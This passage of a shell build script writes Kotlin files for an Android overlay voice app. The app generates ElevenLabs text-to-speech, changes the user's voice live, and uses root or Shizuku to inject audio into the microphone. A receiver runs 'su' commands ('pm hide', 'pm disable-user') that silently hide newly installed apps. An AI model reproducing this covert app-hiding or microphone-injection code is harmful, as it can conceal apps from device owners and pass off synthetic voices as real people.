        if (status == TextToSpeech.SUCCESS) { tts.language = Locale.US; isTtsReady = true }
    }

    override fun onDestroy() {
        tts.stop(); tts.shutdown(); stopPlayback(); super.onDestroy()
    }

    inner class VoiceGridAdapter(private val items: List<File>) : BaseAdapter() {
        override fun getCount() = items.size
        override fun getItem(p: Int) = items[p]
        override fun getItemId(p: Int) = p.toLong()

        override fun getView(p: Int, cv: View?, parent: ViewGroup): View {
            val v = cv ?: LayoutInflater.from(this@GucciVoiceActivity).inflate(R.layout.item_voice_card, parent, false)
            val file = items[p]
            val tvLetter = v.findViewById<TextView>(R.id.tvLetter)
            val tvName = v.findViewById<TextView>(R.id.tvName)
            val btnPlay = v.findViewById<ImageView>(R.id.btnPlay)
            val btnDelete = v.findViewById<ImageView>(R.id.btnDelete)

            val displayName = file.nameWithoutExtension.ifEmpty { "Sound" }
            tvLetter.text = displayName.take(1).uppercase()
            tvName.text = if (displayName.length > 15) displayName.take(15) + "..." else displayName

            if (currentPlayingFile?.absolutePath == file.absolutePath && mediaPlayer?.isPlaying == true) {
                btnPlay.setImageResource(android.R.drawable.ic_media_pause)
            } else {
                btnPlay.setImageResource(android.R.drawable.ic_media_play)
            }

            btnPlay.setOnClickListener {
                if (currentPlayingFile?.absolutePath == file.absolutePath && mediaPlayer?.isPlaying == true) stopPlayback()
                else playVoice(file)
            }

            btnDelete.setOnClickListener {
                AlertDialog.Builder(this@GucciVoiceActivity)
                    .setTitle("Delete Voice").setMessage("Delete $displayName?")
                    .setPositiveButton("Yes") { _, _ -> VoiceDataHelper.deleteVoice(file); loadVoices() }
                    .setNegativeButton("No", null).show()
            }
            return v
        }
    }
}
EOF
cat > app/src/main/java/com/example/shtile/GucciVoiceService.kt << 'EOF'
package com.example.shtile

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.PixelFormat
import android.media.*
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.view.*
import android.view.inputmethod.InputMethodManager
import android.widget.*
import androidx.appcompat.view.ContextThemeWrapper
import androidx.core.content.ContextCompat
import com.google.android.material.materialswitch.MaterialSwitch
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.Locale

class GucciVoiceService : Service(), TextToSpeech.OnInitListener {
    private lateinit var windowManager: WindowManager
    private var overlayView: View? = null
    private var bubbleView: View? = null
    private var tts: TextToSpeech? = null

    private var isInjectOn = false

    private var isLiveOn = false
    private var audioRecord: AudioRecord? = null
    private var liveOutput: DualAudioOutput? = null
    private var liveThread: Thread? = null
    private var pitchSemitones = 0f
    private var echoMs = 0
    private val liveEchoState = VoiceProcessor.EchoState()

    private var mediaPlayer: MediaPlayer? = null

    private var voices: List<File> = emptyList()
    private var gridAdapter: VoiceGridAdapter? = null
    private var params: WindowManager.LayoutParams? = null
    
    private var pbPlayback: ProgressBar? = null
    private val progressHandler = Handler(Looper.getMainLooper())
    private var progressRunnable: Runnable? = null

    private val prefs by lazy { getSharedPreferences("VoicePrefs", Context.MODE_PRIVATE) }
    private val favorites: Set<String> get() = try { prefs.getStringSet("favorites", emptySet()) ?: emptySet() } catch (e: Exception) { emptySet() }

    private val ELEVENLABS_API_KEY = "sk_YOUR_NEW_API_KEY_HERE"
    private val personas = listOf(
        VoicePersona("21m00Tcm4TlvDq8ikWAM", "Rachel"),
        VoicePersona("YOUR_ZARA_ID_HERE", "Zara Gaming")
    )
    private var selectedPersona = personas[0]

    override fun onCreate() {
        super.onCreate()
        try {
            startForegroundServiceNotification()
            tts = TextToSpeech(this, this)
            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
            if (Settings.canDrawOverlays(this)) showFloaterSafely()
            else { Toast.makeText(this, "Overlay Permission missing", Toast.LENGTH_SHORT).show(); stopSelf() }
        } catch (e: Exception) {
            Toast.makeText(this, "Service Error: ${e.message}", Toast.LENGTH_LONG).show(); stopSelf()
        }
    }

    private fun startForegroundServiceNotification() {
        val ch = "gucci_voice_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(NotificationChannel(ch, "Gucci Voices", NotificationManager.IMPORTANCE_MIN))
            val n = Notification.Builder(this, ch).setContentTitle("Gucci Voices Active").setSmallIcon(android.R.drawable.ic_btn_speak_now).build()
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    val hasMic = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
                    if (hasMic) startForeground(99, n, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK)
                    else startForeground(99, n, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK)
                } else startForeground(99, n)
            } catch (_: Exception) { try { startForeground(99, n) } catch (_: Exception) {} }
        }
    }

    private fun showFloaterSafely() {
        try {
            val ctx = ContextThemeWrapper(this, R.style.AppTheme)
            overlayView = LayoutInflater.from(ctx).inflate(R.layout.overlay_gucci_voice, null)
            params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT, WindowManager.LayoutParams.WRAP_CONTENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT
            ).apply { gravity = Gravity.TOP or Gravity.START; x = 50; y = 150 }
            windowManager.addView(overlayView, params)

            overlayView?.findViewById<View>(R.id.dragHandleTop)?.let { setupDrag(it, overlayView!!, params!!) }
            overlayView?.findViewById<ImageButton>(R.id.btnClose)?.setOnClickListener { stopAudioRouting(); stopSelf() }
            overlayView?.findViewById<ImageButton>(R.id.btnMinimize)?.setOnClickListener { minimizeFloater(params!!) }

            val swInject = overlayView?.findViewById<MaterialSwitch>(R.id.swInject)
            val tvCopy = overlayView?.findViewById<TextView>(R.id.tvCopyMixer)
            tvCopy?.visibility = View.GONE

            swInject?.setOnCheckedChangeListener(null)
            swInject?.isChecked = isInjectOn
            swInject?.setOnCheckedChangeListener { _, on ->
                isInjectOn = on
                if (on) {
                    if (!AudioRouter.isRootAvailable() && !AudioRouter.isShizukuAvailable()) {
                        Toast.makeText(this, "Root or Shizuku required", Toast.LENGTH_LONG).show()
                        swInject.isChecked = false
                        return@setOnCheckedChangeListener
                    }
                    AudioRouter.enable(this) { ok, msg ->
                        if (ok) Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
                        else { Toast.makeText(this, msg, Toast.LENGTH_LONG).show(); swInject.isChecked = false }
                    }
                } else {
                    AudioRouter.disable(this); Toast.makeText(this, "Mic injection OFF", Toast.LENGTH_SHORT).show()
                }
            }

            val tabCards = overlayView?.findViewById<LinearLayout>(R.id.tabCards)
            val tabType = overlayView?.findViewById<LinearLayout>(R.id.tabType)
            val tabLive = overlayView?.findViewById<LinearLayout>(R.id.tabLive)
            val pageCards = overlayView?.findViewById<LinearLayout>(R.id.pageCards)
            val pageType = overlayView?.findViewById<LinearLayout>(R.id.pageType)
            val pageLive = overlayView?.findViewById<LinearLayout>(R.id.pageLive)
            
            pbPlayback = overlayView?.findViewById(R.id.pbPlayback)
            pbPlayback?.visibility = View.INVISIBLE

            fun reset() {
                pageCards?.visibility = View.GONE; pageType?.visibility = View.GONE; pageLive?.visibility = View.GONE
                tabCards?.setBackgroundColor(0x00000000); tabType?.setBackgroundColor(0x00000000); tabLive?.setBackgroundColor(0x00000000)
            }
            tabCards?.setOnClickListener { reset(); pageCards?.visibility = View.VISIBLE; tabCards?.setBackgroundResource(R.drawable.bg_box_dark) }
            tabType?.setOnClickListener { reset(); pageType?.visibility = View.VISIBLE; tabType?.setBackgroundResource(R.drawable.bg_box_dark) }
            tabLive?.setOnClickListener { reset(); pageLive?.visibility = View.VISIBLE; tabLive?.setBackgroundResource(R.drawable.bg_box_dark) }

            val spinner = overlayView?.findViewById<Spinner>(R.id.spinnerVoiceSelectFloater)
            spinner?.adapter = ArrayAdapter(this, android.R.layout.simple_spinner_dropdown_item, personas.map { it.name })
            spinner?.onItemSelectedListener = object : AdapterView.OnItemSelectedListener {
                override fun onItemSelected(parent: AdapterView<*>?, view: View?, position: Int, id: Long) { selectedPersona = personas[position] }
                override fun onNothingSelected(parent: AdapterView<*>?) {}
            }

            val gridView = overlayView?.findViewById<GridView>(R.id.lvVoicesFloater)
            loadVoices(); gridAdapter = VoiceGridAdapter(voices, ctx); gridView?.adapter = gridAdapter
            gridView?.setOnItemClickListener { _, _, pos, _ -> if (pos in voices.indices) playVoice(voices[pos]) }

            overlayView?.findViewById<Button>(R.id.btnOverlayRefresh)?.setOnClickListener {
                loadVoices(); gridAdapter = VoiceGridAdapter(voices, ctx); gridView?.adapter = gridAdapter
                Toast.makeText(this, "Refreshed", Toast.LENGTH_SHORT).show()
            }

            val etType = overlayView?.findViewById<EditText>(R.id.etTypeHere)
            etType?.setOnFocusChangeListener { _, hasFocus ->
                if (hasFocus) {
                    params!!.flags = params!!.flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
                    windowManager.updateViewLayout(overlayView, params)
                    val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                    imm.showSoftInput(etType, InputMethodManager.SHOW_IMPLICIT)
                } else {
                    params!!.flags = params!!.flags or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    windowManager.updateViewLayout(overlayView, params)
                }
            }
            overlayView?.findViewById<Button>(R.id.btnOverlaySend)?.setOnClickListener {
                val txt = etType?.text.toString(); if (txt.isNotEmpty()) generateAndPlayOverlay(txt, selectedPersona)
            }
            overlayView?.findViewById<Button>(R.id.btnOverlaySave)?.setOnClickListener {
                val txt = etType?.text.toString(); if (txt.isNotEmpty()) { generateAndSaveOverlay(txt, selectedPersona); etType?.text?.clear() }
            }

            val swLive = overlayView?.findViewById<MaterialSwitch>(R.id.swLiveMic)
            swLive?.isChecked = isLiveOn
            val sbPitch = overlayView?.findViewById<SeekBar>(R.id.sbPitch)
            val sbEcho = overlayView?.findViewById<SeekBar>(R.id.sbEcho)
            val tvPitch = overlayView?.findViewById<TextView>(R.id.tvPitch)
            val tvEcho = overlayView?.findViewById<TextView>(R.id.tvEcho)
            sbPitch?.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
                override fun onProgressChanged(s: SeekBar?, p: Int, fromUser: Boolean) { pitchSemitones = (p - 12).toFloat(); tvPitch?.text = "Pitch: ${pitchSemitones.toInt()}" }
                override fun onStartTrackingTouch(s: SeekBar?) {}; override fun onStopTrackingTouch(s: SeekBar?) {}
            })
            sbEcho?.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
                override fun onProgressChanged(s: SeekBar?, p: Int, fromUser: Boolean) { echoMs = p * 10; tvEcho?.text = "Echo: ${echoMs}ms" }
                override fun onStartTrackingTouch(s: SeekBar?) {}; override fun onStopTrackingTouch(s: SeekBar?) {}
            })
            swLive?.setOnCheckedChangeListener { _, on -> if (on) startLiveMic() else stopLiveMic() }

            overlayView?.findViewById<Button>(R.id.btnOverlayStop)?.setOnClickListener {
                stopPlayback(); stopLiveMic(); swLive?.isChecked = false
                Toast.makeText(this, "Stopped", Toast.LENGTH_SHORT).show()
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Overlay Load Error: ${e.message}", Toast.LENGTH_LONG).show(); stopSelf()
        }
    }

    private fun loadVoices() {
        try {
            val all = VoiceDataHelper.getAllVoices(this)
            val favs = favorites
            voices = all.sortedWith(compareByDescending<File> { favs.contains(it.name) }.thenBy { it.name })
        } catch (_: Exception) { voices = emptyList() }
    }

    private fun toggleFavorite(file: File) {
        try {
            val favs = favorites.toMutableSet()
            if (favs.contains(file.name)) favs.remove(file.name) else favs.add(file.name)
            prefs.edit().putStringSet("favorites", favs).apply()
            loadVoices()
            val ctx = ContextThemeWrapper(this, R.style.AppTheme)
            gridAdapter = VoiceGridAdapter(voices, ctx)
            overlayView?.findViewById<GridView>(R.id.lvVoicesFloater)?.adapter = gridAdapter
        } catch (_: Exception) {}
    }

    private fun stopAudioRouting() { AudioRouter.disable(this) }

    private fun playVoice(file: File) {
        if (isInjectOn) {
            Thread {
                val audio = MediaDecoder.decodeToPcm(file)
                if (audio == null) {
                    Handler(Looper.getMainLooper()).post { Toast.makeText(this, "Decode failed", Toast.LENGTH_SHORT).show() }
                    return@Thread
                }
                
                val durationMs = ((audio.samples.size.toLong() * 1000) / audio.sampleRate).toInt()
                Handler(Looper.getMainLooper()).post { startProgressBar(durationMs) }

                val bytes = ByteArray(audio.samples.size * 2)
                var idx = 0
                for (s in audio.samples) {
                    bytes[idx++] = (s.toInt() and 0xFF).toByte()
                    bytes[idx++] = (s.toInt() shr 8 and 0xFF).toByte()
                }
                AudioRouter.injectAudio(this, bytes)
            }.start()
        } else {
            stopPlayback()
            try {
                mediaPlayer = MediaPlayer().apply {
                    setDataSource(file.absolutePath)
                    setAudioAttributes(AudioAttributes.Builder().setUsage(AudioAttributes.USAGE_MEDIA).build())
                    prepare()
                    startProgressBar(duration)
                    start()
                    setOnCompletionListener { stopPlayback() }
                }
            } catch (e: Exception) {
                Toast.makeText(this, "Cannot play file", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun startProgressBar(durationMs: Int) {
        if (durationMs <= 0) return
        pbPlayback?.visibility = View.VISIBLE
        pbPlayback?.max = durationMs
        pbPlayback?.progress = 0

        var elapsed = 0
        progressRunnable = object : Runnable {
            override fun run() {
                if (mediaPlayer?.isPlaying == true) {
                    pbPlayback?.progress = mediaPlayer!!.currentPosition
                    progressHandler.postDelayed(this, 50)
                } else if (isInjectOn && elapsed < durationMs) {
                    elapsed += 50
                    pbPlayback?.progress = elapsed
                    progressHandler.postDelayed(this, 50)
                } else {
                    pbPlayback?.visibility = View.INVISIBLE
                }
            }
        }
        progressHandler.post(progressRunnable!!)
    }

    private fun stopProgressBar() {
        progressRunnable?.let { progressHandler.removeCallbacks(it) }
        pbPlayback?.visibility = View.INVISIBLE
        pbPlayback?.progress = 0
    }

    private fun callElevenLabsApi(text: String, voiceId: String, onSuccess: (ByteArray) -> Unit, onError: (String) -> Unit) {
        Thread {
            try {
                val url = URL("https://api.elevenlabs.io/v1/text-to-speech/$voiceId")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Accept", "audio/mpeg")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("xi-api-key", ELEVENLABS_API_KEY)
                conn.doOutput = true
                val body = """{"text": "${text.replace("\"", "\\\"")}", "model_id": "eleven_multilingual_v2", "voice_settings": {"stability": 0.5, "similarity_boost": 0.75}}"""
                conn.outputStream.write(body.toByteArray())
                if (conn.responseCode == 200) {
                    val bytes = conn.inputStream.readBytes()
                    Handler(Looper.getMainLooper()).post { onSuccess(bytes) }
                } else Handler(Looper.getMainLooper()).post { onError("API Error: ${conn.responseCode}") }
            } catch (e: Exception) { Handler(Looper.getMainLooper()).post { onError(e.message ?: "Err") } }
        }.start()
    }

    private fun generateAndPlayOverlay(text: String, persona: VoicePersona) {
        Toast.makeText(this, "Generating ${persona.name}...", Toast.LENGTH_SHORT).show()
        callElevenLabsApi(text, persona.id, { bytes ->
            Thread {
                try {
                    val f = File(cacheDir, "temp_overlay.mp3"); f.writeBytes(bytes)
                    val audio = MediaDecoder.decodeToPcm(f)
                    f.delete()
                    if (audio != null) {
                        if (isInjectOn) {
                            val durationMs = ((audio.samples.size.toLong() * 1000) / audio.sampleRate).toInt()
                            Handler(Looper.getMainLooper()).post { startProgressBar(durationMs) }
                            
                            val pcmBytes = ByteArray(audio.samples.size * 2)
                            var idx = 0
                            for (s in audio.samples) {
                                pcmBytes[idx++] = (s.toInt() and 0xFF).toByte()
                                pcmBytes[idx++] = (s.toInt() shr 8 and 0xFF).toByte()
                            }
                            AudioRouter.injectAudio(this, pcmBytes)
                        } else {
                            Handler(Looper.getMainLooper()).post {
                                stopPlayback()
                                try {
                                    mediaPlayer = MediaPlayer().apply {
                                        setDataSource(f.absolutePath)
                                        setAudioAttributes(AudioAttributes.Builder().setUsage(AudioAttributes.USAGE_MEDIA).build())
                                        prepare()
                                        startProgressBar(duration)
                                        start()
                                        setOnCompletionListener { stopPlayback() }
                                    }
                                } catch (e: Exception) {}
                            }
                        }
                    } else Handler(Looper.getMainLooper()).post { Toast.makeText(this, "Decode failed", Toast.LENGTH_SHORT).show() }
                } catch (_: Exception) {}
            }.start()
        }, { err -> Toast.makeText(this, err, Toast.LENGTH_LONG).show() })
    }

    private fun generateAndSaveOverlay(text: String, persona: VoicePersona) {
        Toast.makeText(this, "Saving...", Toast.LENGTH_SHORT).show()
        callElevenLabsApi(text, persona.id, { bytes ->
            Thread {
                try {
                    val f = File(VoiceDataHelper.getVoicesDir(this), "${persona.name.replace(" ", "_")}_${System.currentTimeMillis()}.mp3")
                    f.writeBytes(bytes); loadVoices()
                    Handler(Looper.getMainLooper()).post {
                        val ctx = ContextThemeWrapper(this, R.style.AppTheme)
                        gridAdapter = VoiceGridAdapter(voices, ctx)
                        overlayView?.findViewById<GridView>(R.id.lvVoicesFloater)?.adapter = gridAdapter
                        Toast.makeText(this, "Saved!", Toast.LENGTH_SHORT).show()
                    }
                } catch (_: Exception) { Handler(Looper.getMainLooper()).post { Toast.makeText(this, "Save Error", Toast.LENGTH_SHORT).show() } }
            }.start()
        }, { err -> Toast.makeText(this, err, Toast.LENGTH_LONG).show() })
    }

    private fun startLiveMic() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "Grant Microphone permission first!", Toast.LENGTH_LONG).show(); return
        }
        val rate = VoiceProcessor.SAMPLE_RATE
        val minBuf = AudioRecord.getMinBufferSize(rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT).coerceAtLeast(4096)
        try {
            audioRecord = AudioRecord(MediaRecorder.AudioSource.VOICE_COMMUNICATION, rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, minBuf * 2)
            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                audioRecord = AudioRecord(MediaRecorder.AudioSource.MIC, rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, minBuf * 2)
            }
            audioRecord?.startRecording()
            // Live mic always monitors locally so you can hear yourself (standard behavior)
            liveOutput = DualAudioOutput(rate, AudioFormat.CHANNEL_OUT_MONO, true)
            liveOutput?.start()
            isLiveOn = true
            liveThread = Thread {
                val buf = ShortArray(2048)
                while (isLiveOn) {
                    val n = audioRecord?.read(buf, 0, buf.size) ?: 0
                    if (n > 0) {
                        val chunk = buf.copyOf(n)
                        val out = VoiceProcessor.applyAll(chunk, pitchSemitones, echoMs, 0.3f, 1f, liveEchoState)
                        liveOutput?.write(out)
                    }
                }
            }.apply { start() }
        } catch (e: Exception) {
            Toast.makeText(this, "Mic Error: ${e.message}", Toast.LENGTH_SHORT).show(); stopLiveMic()
        }
    }

    private fun stopLiveMic() {
        isLiveOn = false
        liveThread?.join(500); liveThread = null
        try { audioRecord?.stop(); audioRecord?.release() } catch (_: Exception) {}
        audioRecord = null
        try { liveOutput?.stop() } catch (_: Exception) {}
        liveOutput = null
    }

    private fun minimizeFloater(currentParams: WindowManager.LayoutParams) {
        overlayView?.let { runCatching { windowManager.removeView(it) } }; overlayView = null
        val b = LayoutInflater.from(this).inflate(R.layout.overlay_bubble, null)
        val bp = WindowManager.LayoutParams(100, 100,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT)
        bp.gravity = Gravity.TOP or Gravity.START; bp.x = currentParams.x; bp.y = currentParams.y
        var dragging = false; var ix = 0; var iy = 0; var tx = 0f; var ty = 0f
        b.setOnTouchListener { _, e ->
            when (e.action) {
                MotionEvent.ACTION_DOWN -> { ix = bp.x; iy = bp.y; tx = e.rawX; ty = e.rawY; dragging = false; true }
                MotionEvent.ACTION_MOVE -> { val dx = e.rawX - tx; val dy = e.rawY - ty; if (Math.abs(dx) > 10 || Math.abs(dy) > 10) dragging = true; if (dragging) { bp.x = ix + dx.toInt(); bp.y = iy + dy.toInt(); windowManager.updateViewLayout(b, bp) }; true }
                MotionEvent.ACTION_UP -> { if (!dragging) { windowManager.removeView(b); bubbleView = null; showFloaterSafely() }; true }
                else -> false
            }
        }
        bubbleView = b; windowManager.addView(b, bp)
    }

    private fun setupDrag(handle: View, root: View, params: WindowManager.LayoutParams) {
        handle.setOnTouchListener(object : View.OnTouchListener {
            var ix = 0; var iy = 0; var tx = 0f; var ty = 0f
            override fun onTouch(v: View, e: MotionEvent): Boolean {
                when (e.action) {
                    MotionEvent.ACTION_DOWN -> { ix = params.x; iy = params.y; tx = e.rawX; ty = e.rawY; return true }
                    MotionEvent.ACTION_MOVE -> { params.x = ix + (e.rawX - tx).toInt(); params.y = iy + (e.rawY - ty).toInt(); windowManager.updateViewLayout(root, params); return true }
                }
                return false
            }
        })
    }

    private fun stopPlayback() {
        try { mediaPlayer?.stop(); mediaPlayer?.release() } catch (_: Exception) {}
        mediaPlayer = null
        stopProgressBar()
    }

    override fun onInit(status: Int) { if (status == TextToSpeech.SUCCESS) { tts?.language = Locale.US } }

    override fun onDestroy() {
        super.onDestroy()
        stopPlayback(); stopLiveMic(); tts?.shutdown()
        if (isInjectOn) stopAudioRouting()
        overlayView?.let { runCatching { windowManager.removeView(it) } }
        bubbleView?.let { runCatching { windowManager.removeView(it) } }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    inner class VoiceGridAdapter(private val items: List<File>, private val ctx: Context) : BaseAdapter() {
        override fun getCount() = items.size
        override fun getItem(p: Int) = items[p]
        override fun getItemId(p: Int) = p.toLong()
        override fun getView(p: Int, cv: View?, parent: ViewGroup): View {
            val v = cv ?: LayoutInflater.from(ctx).inflate(R.layout.item_voice_card_mini, parent, false)
            val f = items[p]; val name = f.nameWithoutExtension.ifEmpty { "Sound" }
            v.findViewById<TextView>(R.id.tvLetterMini)?.text = name.take(1).uppercase()
            v.findViewById<TextView>(R.id.tvNameMini)?.text = if (name.length > 8) name.take(8) + ".." else name
            val star = v.findViewById<TextView>(R.id.tvStarMini)
            star?.apply {
                if (favorites.contains(f.name)) { text = "★"; setTextColor(android.graphics.Color.parseColor("#FFD700")) }
                else { text = "☆"; setTextColor(android.graphics.Color.parseColor("#8B949E")) }
                setOnClickListener { toggleFavorite(f) }
            }
            return v
        }
    }
}
EOF
cat > app/src/main/java/com/example/shtile/TransparentActivity.kt << 'EOF'
package com.example.shtile
import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
class TransparentActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val i = Intent(this, FloaterOverlayService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { startForegroundService(i) } else { startService(i) }
        finish()
    }
}
EOF

cat > app/src/main/java/com/example/shtile/TransparentVoiceActivity.kt << 'EOF'
package com.example.shtile
import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
class TransparentVoiceActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val i = Intent(this, GucciVoiceService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { startForegroundService(i) } else { startService(i) }
        finish()
    }
}
EOF
cat > app/src/main/java/com/example/shtile/TransparentVoiceActivity.kt << 'EOF'
package com.example.shtile
import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
class TransparentVoiceActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val i = Intent(this, GucciVoiceService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { startForegroundService(i) } else { startService(i) }
        finish()
    }
}
EOF

cat > app/src/main/java/com/example/shtile/PackageReceiver.kt << 'EOF'
package com.example.shtile
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import java.io.DataOutputStream
class PackageReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_PACKAGE_ADDED) {
            if (intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) return
            val pkg = intent.data?.encodedSchemeSpecificPart ?: return
            val prefs = context.getSharedPreferences("HidePrefs", Context.MODE_PRIVATE)
            if (prefs.getBoolean("is_pay_hidden", false) && (prefs.getStringSet("safe_apps", emptySet()) ?: emptySet()).contains(pkg)) {
                val pendingResult = goAsync()
                Thread { try { val p = Runtime.getRuntime().exec("su"); val os = DataOutputStream(p.outputStream); os.writeBytes("pm hide $pkg; pm disable-user --user 0 $pkg\n"); os.writeBytes("exit\n"); os.flush(); os.close(); p.waitFor() } catch (e: Exception) {} finally { pendingResult.finish() } }.start()
            }
        }
    }
}
EOF

gradle assembleDebug
